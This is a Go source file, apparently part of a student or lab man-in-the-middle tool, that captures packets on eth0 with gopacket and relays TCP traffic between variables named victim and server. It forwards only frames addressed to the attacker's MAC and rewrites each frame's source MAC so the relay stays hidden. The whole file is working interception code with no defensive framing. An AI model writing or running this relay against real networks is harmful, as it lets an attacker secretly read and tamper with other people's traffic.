package main

import (
	"context"
	"fmt"
	"net"
	"reflect"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func createForwardingHandle(nameOfdevice string) *pcap.Handle {
	handle, err := pcap.OpenLive(nameOfdevice, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}
	return handle
}

func launchForwarding(global *global, ctx context.Context) {
	handle := createForwardingHandle("eth0")
	defer handle.Close()
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		select {
		case <-ctx.Done():
			return
		default:
			handleForwardingPacket(handle, packet, global)
		}
	}
}

func handleForwardingPacket(handle *pcap.Handle, packet gopacket.Packet, global *global) bool {

	if etherLayer := packet.Layer(layers.LayerTypeEthernet); etherLayer != nil {
		layerEther, _ := etherLayer.(*layers.Ethernet)
		if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
			layerTcp, _ := tcpLayer.(*layers.TCP)
			if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
				layerIp, _ := ipLayer.(*layers.IPv4)
				if layerIp.SrcIP.Equal(global.victime_ip) && layerIp.DstIP.Equal(global.serveur_ip) && reflect.DeepEqual(layerEther.DstMAC, global.attaquant_mac) {
					fmt.Println("client vers serveur")
					err := forwardPacket(handle, global.victime_ip, global.victime_mac, global.serveur_ip, global.serveur_mac, layerIp, layerTcp)
					if err != nil {
						fmt.Println(err)
						return false
					}
					return true
				}
				if layerIp.SrcIP.Equal(global.serveur_ip) && layerIp.DstIP.Equal(global.victime_ip) && reflect.DeepEqual(layerEther.DstMAC, global.attaquant_mac) {
					fmt.Println("serveur ver client")
					err := forwardPacket(handle, global.serveur_ip, global.serveur_mac, global.victime_ip, global.victime_mac, layerIp, layerTcp)
					if err != nil {
						fmt.Println(err)
						return false
					}
					return true
				}
			}
			return false
		}
		return false
	}
	return false
}

func forwardPacket(handle *pcap.Handle, ip_to_usurpate net.IP, true_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr, layerIp *layers.IPv4, layerTcp *layers.TCP) error {

	eth := layers.Ethernet{
		SrcMAC:       true_mac,
		DstMAC:       mac_target,
		EthernetType: layers.EthernetTypeIPv4,
	}
	payload := gopacket.Payload(layerTcp.Payload)
	layerTcp.SetNetworkLayerForChecksum(layerIp)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	if err := gopacket.SerializeLayers(buf, opts, &eth, layerIp, layerTcp, payload); err != nil {
		return err
	}
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		return err
	}
	return nil
}
